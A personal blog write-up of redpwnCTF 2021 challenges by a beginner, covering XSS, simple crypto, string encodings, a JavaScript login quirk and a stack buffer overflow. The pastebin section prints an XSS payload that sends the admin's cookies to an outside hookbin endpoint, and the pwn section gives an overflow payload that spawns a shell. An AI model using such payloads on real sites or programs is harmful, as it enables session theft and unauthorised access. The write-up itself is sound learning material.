[meta]: <title> (redpwnCTF 2021)
[meta]: <subtitle> (A noob's perspective)
[meta]: <author> (Loek)
[meta]: <date> (July 13 2021)
[meta]: <tags> (hacking, CTF)
[meta]: <cover> (/img/redpwn2021.png)

This is the first 'real' CTF I've participated in. About two weeks ago, a
friend of mine was stuck on some challenges from the Radbout CTF. This was a
closed CTF more geared towards beginners (high school students), and only had a
few challenges which required deeper technical knowledge of web servers and
programming. Willem solved most of the challenges, and I helped solve 3 more.

Apart from those challenges, basically all my hacking knowledge comes from
computerphile videos, liveoverflow videos and making applications myself.

## web/pastebin-1

This challenge is a simple XSS exploit. The website that's vulnerable is
supposed to be a clone of pastebin. I can enter any text into the paste area,
and it will get inserted as HTML code into the website when someone visits the
generated link.

The challenge has two sites: one with the pastebin clone, and one that visits
any pastebin url as the website administrator. The goal of this challenge is
given by it's description:

> Ah, the classic pastebin. Can you get the admin's cookies?

In JS, you can read all cookies without the `HttpOnly` attribute by reading
`document.cookie`. This allows us to read the cookies from the admin's browser,
but now we have to figure out a way to get them sent back to us.

Luckily, there's a free service called [hookbin](https://hookbin.com/) that
gives you an http endpoint to send anything to, and look at the request
details.

Combining these two a simple paste can be created:

```html
<script>
	var post = new XMLHttpRequest();
	post.open("post", "https://hookb.in/<endpoint url>");
	post.send(document.cookie);
</script>
```

## crypto/scissor

I wasn't planning on including this one, but it makes use of the excellent
[CyberChef](https://gchq.github.io/CyberChef/) tool. The flag is given in the
challenge description, and is encrypted using a ceasar/rot13 cipher. A simple
python implementation of this cypher is included with the challenge, but I just
put it into CyberChef and started trying different offsets.

## rev/wstrings

> Some strings are wider than normal...

This challenge has a binary that uses a simple `strcmp` to check the flag. When
running the program, the following output is visible:

```sh
# ./wstrings
Welcome to flag checker 1.0.
Give me a flag>
```

My first stategy was running the `strings` utility on the `wstrings` binary,
but I didn't find the flag. What was interesting to me though was that I also
couldn't find the prompt text... This immediately made me check for other
string encodings.

Running the `strings` utility with the `-eL` flag tells `strings` to look for
32-bit little-endian encoded strings, and lo and behold the flag shows up!

This is because ascii strings are less 'wide' than 32-bit strings:

```
          --- ascii ---

hex -> 0x68 0x65 0x6c 0x6c 0x6f
str -> h    e    l    l    o
```

Notice how each character is represented by a single byte each (8 bits) in
ascii, as opposed to 32-bit characters in 32-bit land.

```
        --- 32-bit land ---

hex -> 0x00000068 0x00000065 0x0000006c 0x0000006c 0x0000006f
str -> h          e          l          l          o
```

I think 32-bit strings also have practical use for things like non-english
texts such as hebrew, chinese or japanese. Those characters take up more space
anyways, and you would waste less space by not using unicode escape characters.

## web/secure

> Just learned about encryption—now, my website is unhackable!

This challenge is pretty simple if you know some of JS's quirks. Right at the
top of the file is an sqlite3 expression in JS:

```js
////////
db.exec(`INSERT INTO users (username, password) VALUES (
    '${btoa('admin')}',
    '${btoa(crypto.randomUUID)}'
)`);
```

This section of code immediately jumped out to me because I noticed that
`crypto.randomUUID` wansn't actually being called.

Because the 'random uuid' is being fed into `btoa()` it becomes a base64
encoded string. However, `btoa()` also expects a string as input. Because every
object in JS has a `.toString()` method, when you pass it into a function
expecting another type, JS will happily convert it for you without warning.

This means that the admin's password will always be a base64-encoded version of
`crypto.randomUUID`'s source code. We can get that base64-encoded source code
by running the following in a NodeJS REPL:

```js
// import file system and crypto modules
var writeFileSync = require('fs').writeFileSync;
var crypto = require('crypto');

// write source to file
writeFileSync('./randomUUID.js', btoa(crypto.randomUUID.toString()), 'utf-8');
```

I made a simple shell script that calls cURL with the base64-encoded
parameters, and decodes the url-encoded flag afterwards:

```sh
#!/bin/sh

# https://stackoverflow.com/questions/6250698/how-to-decode-url-encoded-string-in-shell
function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }

urldecode $(curl -sX POST \
	-d "username=$(printf 'admin' | base64)" \
	-d "password=$(cat ./randomUUID.js)" \
	https://secure.mc.ax/login)
```

## crypto/baby

> I want to do an RSA!

This challenge is breaking RSA. It only works because the `n` parameter is
really small.

Googling for 'rsa decrypt n e c' yields
[this](https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c)
stackoverflow result, which links to
[dcode.fr](https://www.dcode.fr/rsa-cipher). The only thing left to do is
calculate `p` and `q`, which can be done using [wolfram
alpha](https://wolframalpha.com/).

## pwn/beginner-generic-pwn-number-0

> rob keeps making me write beginner pwn! i'll show him...
>
> `nc mc.ax 31199`

This was my first interaction with `gdb`. It was.. painful. After begging for
help in the redpwnCTF discord server about another waaaay harder challenge, an
organizer named asphyxia pointed me towards [gef](https://github.com/hugsy/gef)
which single-handedly saved my sanity during the binary exploitation
challenges.

The first thing I did was use [iaito](https://github.com/radareorg/iaito) to
look at a dissassembly graph of the binary. Iaito is a graphical frontend to
the radare2 reverse engineering framework, and I didn't feel like learning two
things at the same time, so that's why I used it. While it's very
user-friendly, I didn't look into reverse engineering tools very much, and
didn't realise that iaito is still in development. Let's just say I ran into
some issues with project saving so I took lots of unnecessary repeated steps.

After trying to make sense of assembly code after just seeing it for the first
time, I instead decided looking at the source code would be a better idea since
I actually know c.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char *inspirational_messages[] = {
  "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\"",
  "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\"",
  "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\"",
};

int main(void)
{
  srand(time(0));
  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
  char heartfelt_message[32];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts(inspirational_messages[inspirational_message_index]);
  puts("rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!");
  puts("can you write me a heartfelt message to cheer me up? :(");

  gets(heartfelt_message);

  if(inspirational_message_index == -1) {
    system("/bin/sh");
  }
}
```

After looking at this source things became a lot clearer, because the only
input you can actually control is recieved from `gets(...);`

Now comes the hard part: doing it, but in assembly!

Some recources you should consume before attempting binary exploitation would
be [computerphile's video on buffer
overflows](https://www.youtube.com/watch?v=1S0aBV-Waeo) and
[cheat.sh/gdb](https://cheat.sh/gdb) for some basic gdb commands. The rest of
this section assumes you know the basics of both buffer overflows and gdb.

First, let's print a dissassembly of the `int main()` function:

```
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040127c <+134>:   call   0x4010a0 <puts@plt>
   0x0000000000401281 <+139>:   lea    rdi,[rip+0xec8]        # 0x402150
   0x0000000000401288 <+146>:   call   0x4010a0 <puts@plt>
   0x000000000040128d <+151>:   lea    rdi,[rip+0xf1c]        # 0x4021b0
   0x0000000000401294 <+158>:   call   0x4010a0 <puts@plt>
   0x0000000000401299 <+163>:   lea    rax,[rbp-0x30]
   0x000000000040129d <+167>:   mov    rdi,rax
   0x00000000004012a0 <+170>:   call   0x4010f0 <gets@plt>
   0x00000000004012a5 <+175>:   cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   0x00000000004012aa <+180>:   jne    0x4012b8 <main+194>
   0x00000000004012ac <+182>:   lea    rdi,[rip+0xf35]        # 0x4021e8
   0x00000000004012b3 <+189>:   call   0x4010c0 <system@plt>
   0x00000000004012b8 <+194>:   mov    eax,0x0
   0x00000000004012bd <+199>:   leave
   0x00000000004012be <+200>:   ret
End of assembler dump.
```

This isn't the full output from gdb, but only the last few lines. A few things
should immediately stand out: the 3 `<puts@plt>` calls, and right after the
call to `<gets@plt>`. These are the assembly equivalent of:

```c
puts(inspirational_messages[inspirational_message_index]);
puts("rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!");
puts("can you write me a heartfelt message to cheer me up? :(");

gets(heartfelt_message);
```

Since I didn't see any reference to a flag file being read, I assumed that the
`system("/bin/sh")` call is our main target, so let's see if we can find that
in our assembly code. There's a call to `<system@plt>` at `<main+189>`, and
there's other weird `cmp`, `jne` and `lea` instructions before. Let's figure
out what those do!

After some stackoverflow soul searching, I found out that the `cmp` and `jne`
are assembly instructions for compare, and jump-if-not-equal. They work like
this:

```asm6502
;  cmp compares what's in the $rbp register to 0xffffffffffffffff
;  and turns on the ZERO flag if they're equal
   0x004012a5 <+0>:  cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   
;  jne checks if the ZERO flag is on,
;  and if it is it jumps (in this case) to 0x4012b8
┌--0x004012aa <+1>:  jne    0x4012b8 <main+194>
│; we can safely ignore the `lea` instruction as it doesn't impact our pwn
│  0x004012ac <+2>:  lea    rdi,[rip+0xf35]        # 0x4021e8
│
│; the almighty syscall
│  0x004012b3 <+3>:  call   0x4010c0 <system@plt>
│
│; from here on the program exits without calling /bin/sh
└->0x004012b8 <+4>:  mov    eax,0x0
   0x004012bd <+5>:  leave
   0x004012be <+6>:  ret
```

The program checks if there's `0xffffffffffffffff` in memory `0x8` bytes before
the `$rbp` register. The program allocates 32 bytes of memory for our heartfelt
message, but it continues reading even if our heartfelt message is longer than
32 bytes. Let's see if we can overwrite that register >:)

Let's set a breakpoint after the `<gets@plt>` call in gdb, and run the program
with 40 bytes of `0x61` ('a')

```
(gdb) break *0x00000000004012a5
Breakpoint 1 at 0x4012a5

(gdb) run < <(python3 -c "print('a' * 40)")
```

I'm using the `run` command with `<` and `<()` to pipe the output of python
into the program's `stdin`. It's unnecessary at this stage because there's an
'a' key on my keyboard, but if we were to send raw bytes, this would make it a
lot easier.

I'm also using [gef](https://github.com/hugsy/gef) so I get access to a command
called `context` which prints all sorts of information about registers, the
stack and a small dissassembly window. I won't show it's output here, but it
was an indispensable tool that you should install nonetheless.

Let's print the memory at `[$rbp - 0x8]`:

```
(gdb) x/8gx $rbp - 0x8
0x7fffffffd758:  0x0000000000000000 0x0000000000000000
0x7fffffffd768:  0x00007ffff7de4b25 0x00007fffffffd858
0x7fffffffd778:  0x0000000100000064 0x00000000004011f6
0x7fffffffd788:  0x0000000000001000 0x00000000004012c0
```

Hmmm, no overwriteage yet. Let's try 56 bytes instead:

```
(gdb) run < <(python3 -c "print('a' * 56)")
(gdb) x/8gx $rbp - 0x8
0x7fffffffd758:  0x6161616161616161 0x6161616161616161
0x7fffffffd768:  0x00007ffff7de4b00 0x00007fffffffd858
0x7fffffffd778:  0x0000000100000064 0x00000000004011f6
0x7fffffffd788:  0x0000000000001000 0x00000000004012c0
(gdb) x/1gx $rbp - 0x8
0x7fffffffd758: 0x6161616161616161
```

Jackpot! We've overwritten 16 bytes of the adress that the `cmp` instruction
reads. Let's try setting it to `0xff` instead, so we get a shell. Python 3 is
not that great for binary exploitation, so the code for this is a little bit
ugly, but if it works, it works!

```
(gdb) run < <(python3 -c "import sys; sys.stdout.buffer.write(b'a' * 40 + b'\xff' * 8)")
(gdb) x/1gx $rbp - 0x8
0x7fffffffd758: 0xffffffffffffffff
```

Now let's let execution continue as normal by using the `continue` command:

```
(gdb) continue
Continuing.
[Detaching after vfork from child process 22950]
[Inferior 1 (process 22947) exited normally]
```

This might seem underwhelming, but our explit works! A child process was
spawned, and as a bonus, we didn't get any segmentation faults! The reason we
don't get an interactive shell is because we used python to pipe input into the
program which makes it non-interactive.

At this point I was about 12 hours in of straight gdb hell, and I was very
happy to see this shell. After discovering this, I immediately tried it outside
the debugger and was dissapointed to see that my exploit didn't work. After a
small panick attack I found out this was because of my environment variables.
You can launch an environment-less shell by using the `env -i sh` command:

```
λ generic → λ git master* → env -i sh
sh-5.1$ python3 -c "import sys; sys.stdout.buffer.write(b'a' * 40 + b'\xff' * 8)" | ./beginner-generic-pwn-number-0
"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨"
rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
can you write me a heartfelt message to cheer me up? :(
sh-5.1$ # another shell :tada:
```

Now it was time to actually do the exploit on the remote server.

I whipped up the most disgusting and janky python code that I won't go into
detail about, but here's what is does (in short):

1. Create a thread to capture data from the server and forward it to `stdout`
2. Capture user commands using `input()` and decide what to do with them on the main thread

The code for this script can be found
[here](https://github.com/lonkaars/redpwn/blob/master/challenges/generic/pwn.py),
though be warned, it's _very_ janky and you're probably better off copying
stuff from stackoverflow.

It did help me though and I actually had to copy it for use in the other buffer
overflow challenge that I solved, so I'll probably refactor it someday for use
in other CTFs.

## crypto/round-the-bases

## pwn/ret2generic-flag-reader

## rev/bread-making
